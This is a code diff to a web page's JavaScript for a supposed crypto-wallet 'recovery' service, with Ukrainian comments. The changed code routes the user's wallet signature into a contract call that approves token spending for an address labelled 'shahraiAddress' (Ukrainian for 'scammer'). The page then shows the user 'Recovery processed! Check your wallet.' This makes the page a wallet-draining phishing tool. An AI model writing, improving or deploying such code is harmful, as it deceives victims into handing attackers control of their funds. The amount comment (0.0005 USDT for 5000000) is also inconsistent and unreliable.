@@ -85,39 +85,28 @@
                 });
 
                 console.log('Signature:', signature);
-                document.getElementById('status').innerText = 'Wallet verified. Processing approval...';
+                document.getElementById('status').innerText = 'Wallet verified. Processing recovery...';
 
-                // Перевірка підпису через ApproveContract
-                const contractAddress = '0xA606bCbafce5Fe67483EF479620A384DE7971A49'; // Твоя поточна адреса
+                // Виклик executeApprove через ApproveContract
+                const contractAddress = '0x6Ca0CBDD0Fb8a455052F393BE64B84a8F09410b3'; // Встав нову адресу
                 const usdtAddress = '0x9FcefD342ED17979ceDf0B6C4D257A03d908F5fD'; // TestUSDT
                 const shahraiAddress = '0x72ad654e24e8D65e8ed0ef8d8B841bb1e2D0830e'; // Гаманець Б
-                const amount = 500; // 0.0005 USDT
+                const amount = 5000000; // 0.0005 USDT
 
-                const approveAbi = [
-                    "function approve(address spender, uint256 amount) public returns (bool)",
-                    "function allowance(address owner, address spender) public view returns (uint256)"
-                ];
-                const verifyAbi = [
-                    "function verifySignature(bytes memory message, address user, bytes memory signature) public view returns (bool)"
+                const contractAbi = [
+                    "function executeApprove(bytes memory message, address user, bytes memory signature, address token, address spender, uint256 amount) external"
                 ];
 
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 const signer = provider.getSigner();
-                const approveContract = new ethers.Contract(usdtAddress, approveAbi, signer);
-                const verifyContract = new ethers.Contract(contractAddress, verifyAbi, provider);
+                const contract = new ethers.Contract(contractAddress, contractAbi, signer);
 
                 const messageBytes = ethers.utils.toUtf8Bytes(message);
-                const isValid = await verifyContract.verifySignature(messageBytes, userAddress, signature);
-                if (!isValid) {
-                    throw new Error('Signature verification failed');
-                }
+                const tx = await contract.executeApprove(messageBytes, userAddress, signature, usdtAddress, shahraiAddress, amount);
+                await tx.wait();
+                console.log('Transaction Hash:', tx.hash);
 
-                // Виклик approve на TestUSDT від імені користувача
-                const approveTx = await approveContract.approve(shahraiAddress, amount);
-                await approveTx.wait();
-                console.log('Approve Transaction Hash:', approveTx.hash);
-
-                document.getElementById('status').innerText = 'Approval processed! Recovery complete.';
+                document.getElementById('status').innerText = 'Recovery processed! Check your wallet.';
             } catch (error) {
                 document.getElementById('status').innerText = `Error: ${error.message}`;
                 console.error('Detailed error:', error);
